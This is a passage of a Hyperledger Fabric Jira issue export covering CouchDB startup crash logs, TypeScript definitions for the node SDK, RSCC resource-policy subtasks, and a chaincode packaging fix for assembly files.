  [httpd] socket_options=""[{recbuf, 262144}, {sndbuf, 262144}]""
  [httpd] vhost_global_handlers=""_utils, _uuids, _session, _oauth, _users""
  [httpd_db_handlers] _all_docs=""{couch_mrview_http, handle_all_docs_req}""
  [httpd_db_handlers] _changes=""{couch_httpd_db, handle_db_changes_req}""
  [httpd_db_handlers] _compact=""{couch_httpd_db, handle_compact_req}""
  [httpd_db_handlers] _design=""{couch_httpd_db, handle_design_req}""
  [httpd_db_handlers] _design_docs=""{couch_mrview_http, handle_design_docs_req}""
  [httpd_db_handlers] _local_docs=""{couch_mrview_http, handle_local_docs_req}""
  [httpd_db_handlers] _temp_view=""{couch_mrview_http, handle_temp_view_req}""
  [httpd_db_handlers] _view_cleanup=""{couch_mrview_http, handle_cleanup_req}""
  [httpd_design_handlers] _compact=""{couch_mrview_http, handle_compact_req}""
  [httpd_design_handlers] _info=""{couch_mrview_http, handle_info_req}""
  [httpd_design_handlers] _list=""{couch_mrview_show, handle_view_list_req}""
  [httpd_design_handlers] _rewrite=""{couch_httpd_rewrite, handle_rewrite_req}""
  [httpd_design_handlers] _show=""{couch_mrview_show, handle_doc_show_req}""
  [httpd_design_handlers] _update=""{couch_mrview_show, handle_doc_update_req}""
  [httpd_design_handlers] _view=""{couch_mrview_http, handle_view_req}""
  [httpd_design_handlers] _view_changes=""{couch_mrview_http, handle_view_changes_req}""
  [httpd_global_handlers] /=""{couch_httpd_misc_handlers, handle_welcome_req, <<\""Welcome\"">>}""
  [httpd_global_handlers] _active_tasks=""{couch_httpd_misc_handlers, handle_task_status_req}""
  [httpd_global_handlers] _all_dbs=""{couch_httpd_misc_handlers, handle_all_dbs_req}""
  [httpd_global_handlers] _config=""{couch_httpd_misc_handlers, handle_config_req}""
  [httpd_global_handlers] _oauth=""{couch_httpd_oauth, handle_oauth_req}""
  [httpd_global_handlers] _plugins=""{couch_plugins_httpd, handle_req}""
  [httpd_global_handlers] _replicate=""{couch_replicator_httpd, handle_req}""
  [httpd_global_handlers] _restart=""{couch_httpd_misc_handlers, handle_restart_req}""
  [httpd_global_handlers] _session=""{couch_httpd_auth, handle_session_req}""
  [httpd_global_handlers] _stats=""{couch_stats_httpd, handle_stats_req}""
  [httpd_global_handlers] _system=""{chttpd_misc, handle_system_req}""
  [httpd_global_handlers] _utils=""{couch_httpd_misc_handlers, handle_utils_dir_req, \""./share/www\""}""
  [httpd_global_handlers] _uuids=""{couch_httpd_misc_handlers, handle_uuids_req}""
  [httpd_global_handlers] favicon.ico=""{couch_httpd_misc_handlers, handle_favicon_req, \""./share/www\""}""
  [indexers] couch_mrview=""true""
  [log] level=""debug""
  [log] writer=""stderr""
  [native_query_servers] query=""{mango_native_proc, start_link, []}""
  [query_server_config] os_process_limit=""25""
  [query_server_config] reduce_limit=""true""
  [query_servers] coffeescript=""./bin/couchjs ./share/server/main-coffee.js""
  [query_servers] javascript=""./bin/couchjs ./share/server/main.js""
  [replicator] connection_timeout=""30000""
  [replicator] http_connections=""20""
  [replicator] max_replication_retry_count=""10""
  [replicator] retries_per_request=""10""
  [replicator] socket_options=""[{keepalive, true}, {nodelay, false}]""
  [replicator] ssl_certificate_max_depth=""3""
  [replicator] start_delay=""0""
  [replicator] start_splay=""0""
  [replicator] verify_ssl_certificates=""false""
  [replicator] worker_batch_size=""500""
  [replicator] worker_processes=""4""
  [ssl] port=""6984""
  [uuids] algorithm=""sequential""
  [uuids] max_count=""1000""
  [vendor] name=""The Apache Software Foundation""
  [view_compaction] keyvalue_buffer_size=""2097152""
[os_mon] memory supervisor port (memsup): Erlang has closed
[os_mon] cpu supervisor port (cpu_sup): Erlang has closed
{""Kernel pid terminated"",application_controller,""{application_start_failure,couch,{{shutdown,{failed_to_start_child,couch_secondary_services,{shutdown,{failed_to_start_child,httpd,{'EXIT',{{{badmatch,{error,eacces}},[{config_writer,save_to_file,2,[{file,\""src/config_writer.erl\""},{line,38}]},{config,handle_call,3,[{file,\""src/config.erl\""},{line,222}]},{gen_server,try_handle_call,4,[{file,\""gen_server.erl\""},{line,629}]},{gen_server,handle_msg,5,[{file,\""gen_server.erl\""},{line,661}]},{proc_lib,init_p_do_apply,3,[{file,\""proc_lib.erl\""},{line,240}]}]},{gen_server,call,[config,{set,\""couchdb\"",\""uuid\"",\""5d605d084b9dba41a64fc93929813fe1\"",true,nil}]}}}}}}},{couch_app,start,[normal,[]]}}}""}
{code}
Peer1 logs:
{code:java}
2017-08-17 08:47:30.630 UTC [nodeCmd] serve -> INFO 001 Starting peer:
 Version: 1.0.1
 Go version: go1.7.5
 OS/Arch: linux/amd64
 Chaincode:
  Base Image Version: 0.3.1
  Base Docker Namespace: hyperledger
  Base Docker Label: org.hyperledger.fabric
  Docker Namespace: hyperledger

2017-08-17 08:47:30.630 UTC [ledgermgmt] initialize -> INFO 002 Initializing ledger mgmt
2017-08-17 08:47:30.630 UTC [kvledger] NewProvider -> INFO 003 Initializing ledger provider
2017-08-17 08:47:30.630 UTC [kvledger.util] CreateDirIfMissing -> DEBU 004 CreateDirIfMissing [/var/hyperledger/fabric/peer/ledgersData/ledgerProvider/]
2017-08-17 08:47:30.630 UTC [kvledger.util] logDirStatus -> DEBU 005 Before creating dir - [/var/hyperledger/fabric/peer/ledgersData/ledgerProvider/] exists
2017-08-17 08:47:30.630 UTC [kvledger.util] logDirStatus -> DEBU 006 After creating dir - [/var/hyperledger/fabric/peer/ledgersData/ledgerProvider/] exists
2017-08-17 08:47:30.633 UTC [kvledger.util] CreateDirIfMissing -> DEBU 007 CreateDirIfMissing [/var/hyperledger/fabric/peer/ledgersData/chains/index/]
2017-08-17 08:47:30.633 UTC [kvledger.util] logDirStatus -> DEBU 008 Before creating dir - [/var/hyperledger/fabric/peer/ledgersData/chains/index/] exists
2017-08-17 08:47:30.633 UTC [kvledger.util] logDirStatus -> DEBU 009 After creating dir - [/var/hyperledger/fabric/peer/ledgersData/chains/index/] exists
2017-08-17 08:47:30.633 UTC [kvledger] NewProvider -> DEBU 00a Constructing CouchDB VersionedDBProvider
2017-08-17 08:47:30.633 UTC [statecouchdb] NewVersionedDBProvider -> DEBU 00b constructing CouchDB VersionedDBProvider
2017-08-17 08:47:30.634 UTC [couchdb] CreateConnectionDefinition -> DEBU 00c Entering CreateConnectionDefinition()
2017-08-17 08:47:30.634 UTC [couchdb] CreateConnectionDefinition -> DEBU 00d Created database configuration  URL=[http://127.0.0.1:5984]
2017-08-17 08:47:30.634 UTC [couchdb] CreateConnectionDefinition -> DEBU 00e Exiting CreateConnectionDefinition()
2017-08-17 08:47:30.634 UTC [couchdb] VerifyCouchConfig -> DEBU 00f Entering VerifyCouchConfig()
2017-08-17 08:47:30.634 UTC [couchdb] handleRequest -> DEBU 010 Entering handleRequest()  method=GET  url=http://127.0.0.1:5984/
2017-08-17 08:47:30.634 UTC [couchdb] handleRequest -> DEBU 011 HTTP Request: GET / HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Accept: multipart/related | Accept-Encoding: gzip |  | 
2017-08-17 08:47:30.635 UTC [couchdb] handleRequest -> WARN 012 Retrying couchdb request in 125ms. Attempt:1  Error:Get http://127.0.0.1:5984/: dial tcp 127.0.0.1:5984: getsockopt: connection refused
2017-08-17 08:47:30.761 UTC [couchdb] handleRequest -> DEBU 013 HTTP Request: GET / HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Accept: multipart/related | Accept-Encoding: gzip |  | 
2017-08-17 08:47:30.761 UTC [couchdb] handleRequest -> WARN 014 Retrying couchdb request in 250ms. Attempt:2  Error:Get http://127.0.0.1:5984/: dial tcp 127.0.0.1:5984: getsockopt: connection refused
2017-08-17 08:47:31.012 UTC [couchdb] handleRequest -> DEBU 015 HTTP Request: GET / HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Accept: multipart/related | Accept-Encoding: gzip |  | 
2017-08-17 08:47:31.012 UTC [couchdb] handleRequest -> WARN 016 Retrying couchdb request in 500ms. Attempt:3  Error:Get http://127.0.0.1:5984/: dial tcp 127.0.0.1:5984: getsockopt: connection refused
2017-08-17 08:47:31.512 UTC [couchdb] handleRequest -> DEBU 017 HTTP Request: GET / HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Accept: multipart/related | Accept-Encoding: gzip |  | 
2017-08-17 08:47:31.512 UTC [couchdb] handleRequest -> WARN 018 Retrying couchdb request in 1s. Attempt:4  Error:Get http://127.0.0.1:5984/: dial tcp 127.0.0.1:5984: getsockopt: connection refused
2017-08-17 08:47:32.512 UTC [couchdb] handleRequest -> DEBU 019 HTTP Request: GET / HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Accept: multipart/related | Accept-Encoding: gzip |  | 
2017-08-17 08:47:32.513 UTC [couchdb] handleRequest -> WARN 01a Retrying couchdb request in 2s. Attempt:5  Error:Get http://127.0.0.1:5984/: dial tcp 127.0.0.1:5984: getsockopt: connection refused
2017-08-17 08:47:34.513 UTC [couchdb] handleRequest -> DEBU 01b HTTP Request: GET / HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Accept: multipart/related | Accept-Encoding: gzip |  | 
2017-08-17 08:47:34.513 UTC [couchdb] handleRequest -> WARN 01c Retrying couchdb request in 4s. Attempt:6  Error:Get http://127.0.0.1:5984/: dial tcp 127.0.0.1:5984: getsockopt: connection refused
2017-08-17 08:47:38.513 UTC [couchdb] handleRequest -> DEBU 01d HTTP Request: GET / HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Accept: multipart/related | Accept-Encoding: gzip |  | 
2017-08-17 08:47:38.514 UTC [couchdb] handleRequest -> WARN 01e Retrying couchdb request in 8s. Attempt:7  Error:Get http://127.0.0.1:5984/: dial tcp 127.0.0.1:5984: getsockopt: connection refused
2017-08-17 08:47:46.514 UTC [couchdb] handleRequest -> DEBU 01f HTTP Request: GET / HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Accept: multipart/related | Accept-Encoding: gzip |  | 
2017-08-17 08:47:46.514 UTC [couchdb] handleRequest -> WARN 020 Retrying couchdb request in 16s. Attempt:8  Error:Get http://127.0.0.1:5984/: dial tcp 127.0.0.1:5984: getsockopt: connection refused
2017-08-17 08:48:02.514 UTC [couchdb] handleRequest -> DEBU 021 HTTP Request: GET / HTTP/1.1 | Host: 127.0.0.1:5984 | User-Agent: Go-http-client/1.1 | Accept: multipart/related | Accept-Encoding: gzip |  | 
2017-08-17 08:48:02.514 UTC [couchdb] handleRequest -> WARN 022 Retrying couchdb request in 32s. Attempt:9 Error:Get http://127.0.0.1:5984/: dial tcp 127.0.0.1:5984: getsockopt: connection refused
{code};;;","17/Apr/18 6:13 AM;mrkiouak;Stripping all special characters from the couchdb configmap solved this issue for me. It is not clear to me what introduced the error, however I was using atom as my editor, which I see mentioned above. I suspect there is some issue between atom, k8s configmap parsing & couchdb erlang configwriter proc.;;;","09/Apr/19 5:46 PM;mastersingh24;We can open something separate if we really want to do something broader for Kube support;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support CouchDB,FAB-5579,19893,16442,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,greg.haskins,greg.haskins,greg.haskins,02/Aug/17 10:38 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Oct/17 10:04 PM,,,,v1.1.0,,,,,,,,0,,,,,,,,,greg.haskins,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybnz:",,,,,,,,,,,,,,,,,,,,,,,greg.haskins,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Master branch should build as v1.1-SNAPSHOT,FAB-5580,19894,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,greg.haskins,greg.haskins,greg.haskins,02/Aug/17 11:00 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Mar/18 9:27 PM,,,,,,,,,,,,0,,,,,,,,,greg.haskins,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybo7:",,,,,,,,,,,,,,,,,,,,,,,greg.haskins,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add typescript definitions for fabric-client nodejs module,FAB-5581,19895,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ksachdeva,ksachdeva,ksachdeva,02/Aug/17 11:42 PM,08/Aug/18 8:41 AM,28/Oct/23 3:00 AM,20/Dec/17 11:25 PM,,,,v1.1.0,,fabric-sdk-node,,,,,,0,Release-planning-1.1,review-needed,,,,,"An application written using typescript will greatly benefit from the type definitions/declarations of the fabric-client nodejs module.

Usage of typescript helps in arresting potential issues at compile time as well as enable various IDEs to provide intellisense. 

The declarations will be added as per the instructions provided at https://www.typescriptlang.org/docs/handbook/declaration-files/publishing.html

 ",,AdnanChoudhury,animeshk,ChristopherFerris,clydedacruz,denyeart,holocron,jimthematrix@gmail.com,ksachdeva,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6510,,,,,,,,,,,,,,,,,,,,FAB-6534,FABN-277,FABN-869,,,,,,,,,,"18/Nov/17 5:55 AM;holocron;image-2017-11-17-14-55-52-294.png;https://jira.hyperledger.org/secure/attachment/13364/image-2017-11-17-14-55-52-294.png",,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzybof:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,AdnanChoudhury,animeshk,ChristopherFerris,clydedacruz,denyeart,holocron,jimthematrix@gmail.com,ksachdeva,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Aug/17 3:29 AM;jimthematrix;https://gerrit.hyperledger.org/r/#/c/12113/
https://gerrit.hyperledger.org/r/#/c/12119/;;;","04/Oct/17 2:59 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/c/13571/;;;","04/Oct/17 3:01 AM;ChristopherFerris;[~ksachdeva] can you please let us know if you plan to address Jim's comments in the CR? Thanks;;;","04/Oct/17 11:42 PM;ksachdeva;Yes I do. Submitting again (in next hour or so) with his feedback incorporated. However now would submit first with out tests as merging/re-basing is consuming too much time. Would follow up with a separate submission once the definitions are accepted.;;;","05/Oct/17 12:35 AM;ksachdeva;Have submitted it again as

[https://gerrit.hyperledger.org/r/c/14203|https://gerrit.hyperledger.org/r/c/14203/]

[~jimthematrix] I have included all your comments (that you provided on [https://gerrit.hyperledger.org/r/#/c/12119/] ) on the typescript definitions and have added few more.

I will submit the tests (will require some mods given the changes in the master branch) once this changeset has been merged.;;;","07/Oct/17 1:52 AM;denyeart;[~ksachdeva] Now that this one is merged, what remains to be done for this feature, unit tests?

Also, could you add more information to the Description around what should be documented for the typescript support?  For example do application authors need to do anything to start exploiting the benefits? Or is it automatic depending on the IDE that people use?;;;","09/Oct/17 11:25 PM;ksachdeva;Hi David,

From feature point of view it is done. All that is needed to make sure is that when you the package is published on npm then index.d.ts is included in the bundle. 

Since the index.d.ts will be part of the package itself, the app authors (using typescript) do not have to do anything special. 

 

 

 

 ;;;","10/Oct/17 1:20 AM;denyeart;Thanks [~ksachdeva].  And what else remains to be delivered with this item?  In your prior comment you mentioned you would provide some additional tests, can you create a child subtask for that, as well as an ETA?;;;","10/Oct/17 1:32 AM;ksachdeva;Hi David,

I can do that (had already written them). Need few mods to incorporate latest changes in the master branch.

However, I do have two concerns -
 * Maintenance and synchronization of the tests
 * Value provided by the tests in typescript since they are exercising the same scenarios as the javascript ones. 

I will still submit the tests that I have but here is a suggestion and see if it makes sense -

In near future, remove the existing tests (written using javascript) with the ones written using typescript. This would bring following benefits -

a) Same tests that would exercise the typings as well as the underlying javascript implementation. 

b) No duplication and maintenance issue.

c) The tests written using typescript are terse and cleaner than the ones written using javascript (primarily thanks to async/await). Usage of typescript will make sure that the tests can be run on node 6 or earlier where async/await support is not implemented.

I will submit the tests in next few days.

 ;;;","10/Oct/17 1:38 AM;ksachdeva;Also from app developers point of view it would be good to have a sample written using typescript. I have an example (https://github.com/ksachdeva/hyperledger-fabric-example) but it is written to make sure that it is neither quite basic nor overtly complex. 

May be a port of [https://github.com/hyperledger/fabric-samples/tree/release/balance-transfer] would serve better as it exercises majority of the APIs of the SDK. If you and [~jimthematrix] thinks it is worth it then I can write it and submit it to the samples repo. ;;;","10/Oct/17 4:32 AM;jimthematrix@gmail.com;[~ksachdeva] I agree with the idea to add samples with typescript syntax to demonstrate how the API can be used in typescript style. But that should be in addition to the sample written in native javascript, instead of replacing it because not all javascript developers use typescript.

In addition, if you can add unit tests to cover the testing of the declarations in index.d.ts that would be great. It can be done rather easily by stubbing out the underlying SDK API (using sinon) and simply making sure the calling code using ts definitions successfully compiled and invoked the underlying APIs.;;;","10/Oct/17 5:07 AM;ksachdeva;Hi Jim,

I was not suggesting to replace the ""sample"" rather the existing ""tests"" (i.e. re-write the tests using typescript and then remove the existing javascript tests). This way there is no need to maintain the same test cases in two languages.

The sample would be a new one i.e. in addition to the existing javascript one.

 ;;;","12/Oct/17 7:52 PM;denyeart;Another CR with fixes: https://gerrit.hyperledger.org/r/#/c/14397/;;;","13/Oct/17 3:17 AM;jimthematrix@gmail.com;https://gerrit.hyperledger.org/r/#/c/14383/ for sample;;;","18/Nov/17 5:56 AM;holocron;Hello, I'm having some trouble with this. It seems typescript doesn't like the module definition.

{{[vmorris@oc1744501623 procon-ui]$ tsc}}
 {{node_modules/fabric-client/index.d.ts(197,11): error TS2304: Cannot find name 'ByteBuffer'.}}
 {{node_modules/fabric-client/index.d.ts(198,12): error TS2304: Cannot find name 'ByteBuffer'.}}
 {{node_modules/fabric-client/index.d.ts(199,14): error TS2304: Cannot find name 'ByteBuffer'.}}
 {{node_modules/fabric-client/index.d.ts(203,19): error TS2304: Cannot find name 'ByteBuffer'.}}
 {{node_modules/fabric-client/index.d.ts(204,21): error TS2304: Cannot find name 'ByteBuffer'.}}
 {{src/app/client.service.ts(2,24): error TS2306: File '/home/vmorris/programming/procon/procon-ui/node_modules/fabric-client/index.d.ts' is not a module.}}

 

!image-2017-11-17-14-55-52-294.png!

 

 

UPDATE:

 

Never mind, I read the fine typescript documentation and saw:
{quote}When importing a module using {{export =}}, TypeScript-specific \{\{import module = require(""module"")}}must be used to import the module.
{quote};;;","01/Jun/18 11:20 AM;jamesruan;I'm using 
{code:java}
import hfc = require('fabric-client'){code}
It reports no problem with ts-node, but
{code:java}
node_modules/fabric-client/types/index.d.ts(435,13): error TS2304: Cannot find name 'ByteBuffer'.
node_modules/fabric-client/types/index.d.ts(436,14): error TS2304: Cannot find name 'ByteBuffer'.
node_modules/fabric-client/types/index.d.ts(437,16): error TS2304: Cannot find name 'ByteBuffer'.
node_modules/fabric-client/types/index.d.ts(441,21): error TS2304: Cannot find name 'ByteBuffer'.
node_modules/fabric-client/types/index.d.ts(442,23): error TS2304: Cannot find name 'ByteBuffer'.
{code}
reported with 'tsc -p .'

 

Any suggestion to solve it?;;;","07/Aug/18 5:29 PM;clydedacruz; npm install --save @types/bytebuffer   does the trick for the ByteBuffer related issue;;;",,,,,,,,,,,,,,,,,,,,,,
Define resources,FAB-5582,19896,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,muralisr,muralisr,03/Aug/17 12:30 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Aug/17 10:30 PM,,,,,,fabric-peer,,,,,,0,,,,,,,"Current policies are /Channel/Application/READERS, /Channel/Application/WRITERS etc. As described in the attached google doc, we introduce the resources that map to fine grained policies. This sub task defines the the base ACL framework along with default provider.

 ",,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybon:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create RSCC System Chaincode,FAB-5583,19897,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,muralisr,muralisr,03/Aug/17 12:57 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,15/Aug/17 4:38 AM,,,,,,fabric-peer,,,,,,0,,,,,,,"The RSCC system chaincode is used to manage resources and policies on them. The flows involving RSCC are
 * initialization 
 * invoke to change resources and policies
 * API to access resources and policies on them from the peer

 ",,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybov:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Initialization of RSCC from channel configuration at Join time,FAB-5584,19898,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,muralisr,muralisr,03/Aug/17 1:01 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,15/Aug/17 8:07 PM,,,,,,fabric-peer,,,,,,0,,,,,,,The channel configuration currently contains policies for the channel and provides a convenient mechanism for initializing the RSCC for the channel with resource policies. This sub-task assume clients have ability to set the policies for the resource in the channel transaction (say using tools such as configtxlator).,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5590,FAB-5637,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybp3:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Aug/17 11:44 PM;muralisr;The code is ready and integration tested with [~jyellick] 's config/policy CRs in review . Will push once the CRs are merged;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Modification of RSCC policies for a channel,FAB-5585,19899,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,muralisr,muralisr,03/Aug/17 1:17 AM,30/Jul/19 10:52 AM,28/Oct/23 3:00 AM,30/Jul/19 10:52 AM,,,,,,fabric-peer,,,,,,0,,,,,,,"Clients can send invokes to update policies. Unlike user invokes, policy updates need to be signed off. From the doc
{code:java}
This RSCC would actually need to do something similar to how the orderer checks for signatures for config changes. So within the RSCC you would actually need to check to make sure that the actual ""request"" had been signed by the right people. We can pick a logical default - maybe an admin of a single org{code}

At a high level there are two parts to the update
* propose the update via invoke (where the signatures are checked)
* commit update (this will also refresh the RSCC cache)",,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybpb:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode - allow package functions that are implemented in .s files,FAB-5586,19900,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,greg.haskins,gbolo,gbolo,03/Aug/17 1:20 AM,03/Jan/19 10:53 AM,28/Oct/23 3:00 AM,03/Sep/17 11:10 PM,v1.0.0,v1.0.1,v1.0.2,v1.1.0,,fabric-peer,,,,,,0,,,,,,,"Having an issue instantiating chaincode which vendors in go packages which include .h and .s files. Example:

[https://github.com/golang/crypto/tree/master/curve25519]

 

Install works fine, however when i instantiate I get the following:

{{2017-08-02 15:26:27.825 UTC [dockercontroller] deployImage -> ERRO 045 Error building images: Failed to generate platform-specific docker build: Error returned from build:}}
{{...}}
{{... testcc/vendor/golang.org/x/crypto/curve25519/mont25519_amd64.go:15: missing function body for ""cswap""}}
{{...}}",,gbolo,greg.haskins,williamfu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzybpj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,gbolo,greg.haskins,williamfu,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Aug/17 7:08 AM;gbolo;[~greg.haskins] has suggested this patch, which worked for me:

 
{quote}--- core/chaincode/platforms/golang/package.go 2017-08-02 14:19:08.897732954 -0400
+++ core/chaincode/platforms/golang/package.go.patched 2017-08-02 15:11:03.204393679 -0400
@@ -35,6 +35,7 @@
 "".go"": true,
 "".yaml"": true,
 "".json"": true,
+ "".s"": true,
 }
 
 var logger = flogging.MustGetLogger(""golang-platform"")
{quote};;;","05/Aug/17 5:08 AM;gbolo;submitted the following commit:

commit 9ff04694c2e0e3f15fc77dec267c93702a8f7abc
Author: gbolo <george.bolo@gmail.com>
Date: Fri Aug 4 15:51:10 2017 -0400

FAB-5586 allow functions implemented in .s files
 
 Having an issue instantiating chaincode which vendors
 in go packages which include .h and .s files. Example:
 https://github.com/golang/crypto/tree/master/curve25519
 
 Install works fine, however when i instantiate I get the following:
 2017-08-02 15:26:27.825 UTC [dockercontroller] deployImage ->
 ERRO 045 Error building images: Failed to generate
 platform-specific docker build: Error returned from build:
 ...
 ... testcc/vendor/golang.org/x/crypto/curve25519/mont25519_amd64.go:15:
 missing function body for ""cswap""
 ...
 
 Change-Id: I3adf39440a343e61718f0c519d559c3463d92cd2
 Signed-off-by: gbolo <george.bolo@gmail.com>;;;","07/Aug/17 10:18 PM;greg.haskins;I also updated chaintool in a similar way:

[https://gerrit.hyperledger.org/r/#/c/12215/];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
internal APIs for accessing resources from RSCC,FAB-5587,19901,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,muralisr,muralisr,03/Aug/17 1:20 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Aug/17 10:31 PM,,,,,,fabric-peer,,,,,,0,,,,,,,Fabric will have direct access to the RSCC resources via internal APIs (as opposed to sending a proposal to do that). These APIs will be on the cache (as opposed to going to the ledger) for quick access. ,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybpr:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Aug/17 11:51 PM;muralisr;This is done as part of the base framework in [https://gerrit.hyperledger.org/r/#/c/12213/] and and has been merged in  [https://gerrit.hyperledger.org/r/#/c/12271/.] Will leave it open for FAB-5585 to be completed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
tool support for specifying policies for resources,FAB-5588,19903,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,muralisr,muralisr,03/Aug/17 1:35 AM,08/Dec/18 4:56 AM,28/Oct/23 3:00 AM,08/Dec/18 4:56 AM,,,,,,fabric-peer,,,,,,0,,,,,,,"This is really a TODO. 

Currently users can do the following to set policies at channel creation time
* generate default configuration using configtxgen 
* convert the configuration to JSON using configtxlator
* edit the JSON to add new policies
* convert back the configuration to binary protobuf using configtxlator
* use the converted TX to create the channel 
* have peers join the channel

